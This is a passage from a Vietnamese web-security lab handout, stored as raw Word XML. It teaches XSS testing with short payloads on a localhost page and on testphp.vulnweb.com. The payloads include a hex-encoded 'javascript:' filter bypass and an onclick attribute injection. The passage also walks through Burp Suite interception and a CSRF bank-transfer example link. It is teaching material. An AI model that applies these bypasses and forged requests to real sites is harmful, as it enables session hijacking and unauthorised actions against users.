          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">tạo ra. Xem mã nguồn của trang trả về cho thấy địa chỉ trên được gán vào thuộc tính href của thẻ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4686D38F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C1BFAD2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Thực hiện phân tích tương tự trên ta thấy có hai tham số được truyền bằng phương thức POST là site và</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797145A8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token. Trong đó token là một tham số ẩn được nhúng vào form của trang Web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B908DF5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63B389BF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Phân tích tham số đầu vào và xác định sự ảnh hưởng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F49B8F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Ở trên, ta đã thấy có tham số ẩn là token nhưng không thấy sự hiện diện của nó trong kết quả trả về là</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DBFF92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đường dẫn được tạo ra. Do không đủ cơ sở đến phán đoán nên ta không xét đến tham số này trong ví dụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1836B4FA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 xml:space="preserve">Tiếp theo, ta thấy rằng giá trị tham số được gán cho thuộc tính href của thẻ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028FD20F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a href = &amp;quot;Giá trị đầu vào&amp;quot;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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Link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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/a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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD04E59">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60281811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Cách thức kiểm thử 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FCF53B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Ta thử truyền trực tiếp mã thực thi dưới dạng javascript:Mã thực thi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D401A1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Bước 1: Kiểm thử với giá trị đầu vào javascript:alert(1). Kết quả cho thấy từ script đã bị lọc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6F8B92">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7671C758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Bước 2: Thử nghiệm tương tự với các cách thức biến đổi như ở ví dụ trước ta thấy từ script luôn bị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429C8FC9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lọc. Do đó, ta thử các dạng biểu diễn bằng mã Unicode cho từ khóa javascript là</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0C033A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&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74:alert(1). Kết quả cho ta thấy giá trị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059572F7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đầu vào này vẫn giữ nguyên mà không bị lọc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6976F7E0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55A839C1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Bước 3: Kiểm tra lại kết quả bằng các nhấn vào đường dẫn đã tạo ra trên trang kết quả, ta thấy đoạn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD98F85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mã đã được thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D28606">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F7AED7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Cách thức kiểm thử 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6543F5E3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Ở cách thức trên, ta thấy chuỗi script bị lọc. Do đó ta có thể tìm cách thực thi mã nguồn thông qua các</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8F9A60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 xml:space="preserve">thuộc tính sự kiện. Ở dạng này thì mã thực thi không cần đặt trong thẻ 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> và cũng không cần đến</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544FA50C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tiếp đầu ngữ javascript. Ta tìm cách đưa giá trị đầu vào để đường dẫn tạo ra có dạng như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AAD47E7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a href = &amp;quot;Địa chỉ nào đó&amp;quot; onclick=&amp;quot;alert(1)&amp;quot;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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Link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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/a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&gt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/h3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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64382D47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Lưu ý lại rằng, giá trị tham số được truyền cho thuộc tín href như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014E2190">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a href = &amp;quot;Giá trị đầu vào&amp;quot;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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Link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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/a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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCE8C13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Vì vậy có thể sử dụng giá trị đầu vào là anything&amp;quot; onclick=&amp;quot;alert(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7C9606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Các bạn tự kiểm tra lại kết quả kiểm thử</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A54A2E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2.5. Sử dụng công cụ hỗ trợ kiểm thử Burp Suite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2943FD08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Trong phần này, chúng ta sử dụng công cụ Burp Suite để truyền giá trị cho các tham số khi thực hiện</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D3D6C5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kiểm thử. Kỹ năng này hữu dụng khi chúng ta cần truyền giá trị cho các trường ẩn, thay đổi các giá trị</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7222538A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mặc định trong Web form hay thậm chí thay đổi cả giá trị của các tiêu đề HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C8FB63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Bước 1: Cấu hình và khởi động Burpsuite như hướng dẫn ở phần trước</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C37641C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Bước 2: Trên cửa sổ công cụ Burpsuite, mở thẻ Proxy  Intercept và chắc chắn tính năng Intercept is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB58101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on đã được bật</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EDDA58">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="212F8C95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Bước 3: Mở địa chỉ trang Web cần kiểm thử. Ví dụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308E0373">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01F97E26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http://localhost/xss/xss2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3F5289">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14DB27EF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Bước 4: Điền các giá trị đầu vào bất kỳ nào đó và gửi yêu cầu từ trình duyệt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C4937C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Bước 5: Trên thẻ Intercept chúng ta có thể thấy thông điệp yêu cầu bị chặn giữ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FB3104">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E8ED1E7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Bước 7: Sửa trực tiếp các giá trị tham số cần thiết trên thẻ Raw hoặc trong thẻ Params. Sau đó nhấn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3895B57E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Forward.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B99CA20">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6170E80E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hoặc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384B1CE3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C500EED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Bước 8: Trên trình duyệt Web, ta nhận được trang kết quả trả về cho giá trị tham số vừa sửa đổi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65620A30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3 CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3C71C0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3.1 Giới thiệu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40637E24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Cross Site Request Forgery (CSRF) là một kỹ thuật tấn công buộc người dùng thực hiện các hành vi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46365F8D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không mong muốn trên một ứng dụng web mà họ đã thực hiện xác thực (chẳng hạn như đã login).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C10ABB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Một cuộc tấn công CSRF được thực hiện bằng cách lừa nạn nhân thực hiện một HTTP Request độc hại.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B16363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Nó kế thừa đầy đủ tính năng và quyền các nạn nhân để thực hiện một chức năng không mong muốn. Đối</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F844997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với hầu hết ứng dụng web, trình duyệt tự động thêm các thông tin xác thực của người dùng mỗi lần gửi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE84B07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request như cookie, địa chỉ IP… Do đó, nếu người dùng đã được xác thực cho một ứng dụng web, sẽ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA819DE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không có cách nào để phân biệt giữa các request giả mạo và request hợp lệ được gửi bởi nạn nhân.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAF788D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="720F624F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Bằng cách này, kẻ tấn công có thể làm cho nạn nhân thực hiện hành động mà họ không có ý định, chẳng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F1D4C8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hạn như đăng xuất, mua hàng, thay đổi thông tin tài khoản hoặc bất kỳ chức năng khác được cung cấp bởi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDCEE7B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ứng dụng web đó.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487DF686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3.2 Kịch bản tấn công</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0007CB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Alice đang đăng nhập vào website ngân hàng của cô. Tại website này, một lệnh chuyển tiền có dạng sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D419E4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GET http://bank.com/transfer.do?acct=bob&amp;amp;amount=100 HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D3E639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Trong đó:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA0CA72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Acct là username của người nhận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1032B8F3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- Amount là số tiền cần chuyển</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F7CECB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Eve bằng cách nào đó biết được Alice đã login và hắn muốn lấy tiền từ tài khoản của Alice. Eve gửi cho</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8F6781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Alice (qua email, hay chat, forum…) một đường link website của Eve, trong đấy HTML có chứa đoạn mã</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281F3B12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sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F67BC0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  <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a href=&amp;quot;http://bank.com/transfer.do?acct=Eve&amp;amp;amount=100000&amp;quot;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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>View my</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2167FE66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Pictures!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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478AAD68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Và nếu Alice click vào dòng chữ View my Pictures thì ngay lập tức, tiền được chuyển cho Eve</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA2E7BC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3.3. Kiểm thử lỗ hổng CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F8D55E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Xem thêm cách thức sử dụng công cụ CSRFTester để kiểm thử lỗi CSRF trên website:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258D03BA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https://www.youtube.com/watch?v=2EpLrF27re4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59449360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4 Bài thực hành</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A08FA3D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Lưu ý:Tắt tính năng phòng chống XSS trên trình duyệt khi thực hiện kiểm thử</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C0F819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Phần 1: Kiểm tra xem các trang web có lỗ hổng XSS không? Giải thích cách thực hiện.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77844B6D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Phần 2: Kiểm tra xem trang web có lỗ hổng CSRF không? Giải thích cách thực hiện.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C7F3DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8AF82B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Phần 1: Kiểm thử XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0084664E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Câu 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3AAEA1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Thực hiện kiểm thử lỗ hổng XSS để thực thi đoạn mã hiển thị thông báo có chứa 4 số cuối MSSV.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B58AA90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Hãy giải thích:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482642AE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Thực hiện kiểm thử lỗ hổng XSS trên website: chọn 1 trong các trang sau để thử nghiệm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C43F16">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>chọn:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://testphp.vulnweb.com" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="51"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://testphp.vulnweb.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C32500">
      <w:pPr>
        <w:pStyle w:val="85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eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
